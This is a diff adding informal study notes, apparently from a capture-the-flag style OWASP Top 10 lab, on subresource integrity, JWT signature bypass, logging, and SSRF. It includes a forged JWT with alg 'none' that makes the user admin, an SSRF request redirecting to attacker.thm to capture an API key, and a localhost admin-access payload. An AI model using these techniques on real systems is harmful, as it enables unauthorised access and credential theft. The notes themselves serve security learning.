@@ -229,3 +229,113 @@ This vulnerability arises from code or infrastructure that uses software or data
 1.)  Software Integrity Failures
 2.)  Data Integrity Failures
 
+  -->  Software Integrity Failures
+Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.
+
+The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of https://code.jquery.com/jquery-3.6.1.min.js to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called """""""""""Subresource Integrity (SRI)"""""""", and you can read more about it here.(https://www.srihash.org/)
+
+The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+
+""""""""""""  You can go to https://www.srihash.org/ to generate hashes for any library if needed.  """""""""""""""""""""""""""""
+
+  -->  Data Integrity Failures
+
+Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.
+
+This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.
+
+One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).
+
+JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. 3 parts of JWT -->
+1.)  Header
+2.)  Payload
+3.)  Signature
+
+The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.
+
+(https://appdevtools.com/) /my be usefull in future i dont know
+
+-->  JWT and the None Algorithm
+A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:
+
+1.)  Modify the header section of the token so that the alg header would contain the value none.
+2.)  Remove the signature part.
+
+Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.
+
+"""""""""""""""""""""""""""""""""""""""""""""""  TASK -->""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""'
+
+--> initial
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9. --> typ=JWT and algo =something
+eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzIzNzMwMzY5fQ. --> username guest and time/something
+6Q1gd4wVH-HHtVjDZf1HRBCcDhMgpn3HbYAOxO0YoTY   --> signature
+
+final -->
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.  --> typ=jwt and algo =none
+eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzIzNzMwMTY5fQ==. --> username =adming and time/something (remain same)
+
+NOTE --> add . at the end of each part of JWT like header , payload and if signature
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""'  Solve parts individually """"""""""""""""""""""""""""""""""""""""""""""
+
+  -->  9. Security Logging and Monitoring Failures
+When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. 
+
+*  Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
+*  Risk of further attacks: an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
+
+The information stored in logs should include the following:
+
+HTTP status codes
+Time Stamps
+Usernames
+API endpoints/page locations
+IP addresses
+These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.
+
+Common examples of suspicious activity include:
+*  Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
+*  Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
+*  Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
+*  Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
+
+  -->  10. Server-Side Request Forgery (SSRF)
+This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.
+
+""""""""""""""""""""""""""""""""""""""for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:""""""""""""""""""""""""""""""""""""""""""""""""
+
+"""""""""""""""""""""  The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:  """""""""""""""
+
+step-1.)  https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+step-2.)  This would make the vulnerable web application make a request to:
+step-3.)  https://attacker.thm/api/send?msg=ABC 
+step-4.)  You could then just capture the contents of the request using Netcat:
+
+This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
+-->  Enumerate internal networks, including IP addresses and ports.
+-->  Abuse trust relationships between servers and gain access to otherwise restricted services.
+-->  Interact with some non-HTTP services to get remote code execution (RCE).
+Let's quickly look at how we can use SSRF to abuse some trust relationships.
+
+task -->
+here we got a admin portal only for loacl user --> we got a resume download link where server info is given --> change it to your local ip and start nc you will get api key --> now for extra credit use this
+
+side kick to gain access to admin area
+http://10.10.190.86:8087/download?server=http://localhost:8087/admin%23&id=75482342
+(machineIP/download?server=http://localhost:8087(as only localhost is authenticated)/admin#&id=75482342)
+here %23 = # which is like injection to prevent from id to read more why we use this here is the link (https://www.w3schools.com/tags/ref_urlencode.asp?_sm_au_=iVVDMg0TSmrMV6Dm)
+
+Possible Reasons for Using #
+-->  Routing or Resource Identification:
+The # might be used within the server URL parameter to indicate a specific endpoint or resource on the server. For example, it could be used to specify an admin interface or a specific part of an API endpoint.
+-->  Application Logic:
+The application receiving this URL might be using the # to differentiate between different types of requests or to handle routing based on parameters.
+-->  Avoiding Conflicts:
+URL encoding ensures that the # is treated as part of the data rather than a fragment identifier, preventing misinterpretation by the browser or server.
+
+I figured out that you can use a method similar to SQL injection to break up the server and id in the link (obfuscation). Some forums called it “escaping the # (hash)”. 
+The link works still, so we need to break up id. But, if you drop the “id=75482342” the link will not work. So, we have to keep the link intact while breaking the server from the id. I had to do a lot of digging for this.
